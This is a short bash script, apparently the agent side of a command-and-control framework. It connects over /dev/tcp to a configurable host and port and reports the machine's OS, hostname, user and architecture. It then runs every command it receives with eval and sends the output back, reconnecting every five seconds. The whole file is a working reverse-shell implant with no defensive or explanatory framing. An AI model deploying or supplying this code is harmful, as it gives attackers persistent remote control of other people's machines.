#!/bin/bash
C2HOST="${1:-127.0.0.1}"
C2PORT="${2:-4444}"
DELAY=5

GetInfo() {
    OS=$(uname -s 2>/dev/null || echo "Unknown")
    HOST=$(hostname 2>/dev/null || echo "Unknown")
    USER=$(whoami 2>/dev/null || echo "Unknown")
    ARCH=$(uname -m 2>/dev/null || echo "Unknown")
    printf '{"os":"%s","hostname":"%s","user":"%s","architecture":"%s","agentip":"%s","shellmode":"Raw"}\n' \
        "$OS" "$HOST" "$USER" "$ARCH" "$C2HOST"
}

while true; do
    exec 3<>/dev/tcp/$C2HOST/$C2PORT 2>/dev/null
    if [ $? -ne 0 ]; then sleep $DELAY; continue; fi
    echo "$(GetInfo)" >&3
    read -r KEY <&3
    while true; do
        read -r CMD <&3 || break
        CMD=$(echo "$CMD" | tr -d '\r')
        [ -z "$CMD" ] && continue
        OUT=$(eval "$CMD" 2>&1)
        printf '%s\n' "${OUT:-}" >&3
    done
    exec 3>&-
    sleep $DELAY
done
